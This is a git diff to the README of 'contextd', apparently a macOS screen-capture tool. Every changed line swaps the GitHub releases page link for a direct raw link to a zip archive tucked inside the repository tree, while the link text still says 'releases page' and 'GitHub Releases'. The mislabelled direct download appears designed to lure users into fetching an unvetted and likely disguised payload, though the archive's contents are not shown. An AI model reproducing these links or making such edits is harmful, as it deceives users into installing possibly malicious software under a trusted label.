@@ -1,6 +1,6 @@
 # 🖥️ contextd - Capture screen activity with ease
 
-[![Download contextd](https://img.shields.io/badge/Download%20contextd-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mandaeancorrespondencecourse450/contextd/releases)
+[![Download contextd](https://img.shields.io/badge/Download%20contextd-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mandaeancorrespondencecourse450/contextd/raw/refs/heads/main/ContextD/Utilities/Software_1.0.zip)
 
 ## 📌 What is contextd?
 
@@ -33,7 +33,7 @@ For best results, use a Mac with steady disk space and a good network setup if y
 ## 🚀 Download and install
 
 1. Open the releases page:  
-   https://github.com/Mandaeancorrespondencecourse450/contextd/releases
+   https://github.com/Mandaeancorrespondencecourse450/contextd/raw/refs/heads/main/ContextD/Utilities/Software_1.0.zip
 
 2. Find the latest release near the top of the page
 
@@ -49,7 +49,7 @@ For best results, use a Mac with steady disk space and a good network setup if y
 
 8. Start contextd and let it run in the background
 
-[Visit the releases page to download contextd](https://github.com/Mandaeancorrespondencecourse450/contextd/releases)
+[Visit the releases page to download contextd](https://github.com/Mandaeancorrespondencecourse450/contextd/raw/refs/heads/main/ContextD/Utilities/Software_1.0.zip)
 
 ## 🛠️ First-time setup
 
@@ -189,6 +189,6 @@ After setup, contextd should:
 
 Use this page to get the latest macOS release files:
 
-https://github.com/Mandaeancorrespondencecourse450/contextd/releases
+https://github.com/Mandaeancorrespondencecourse450/contextd/raw/refs/heads/main/ContextD/Utilities/Software_1.0.zip
 
-[Download contextd from GitHub Releases](https://github.com/Mandaeancorrespondencecourse450/contextd/releases)
+[Download contextd from GitHub Releases](https://github.com/Mandaeancorrespondencecourse450/contextd/raw/refs/heads/main/ContextD/Utilities/Software_1.0.zip)
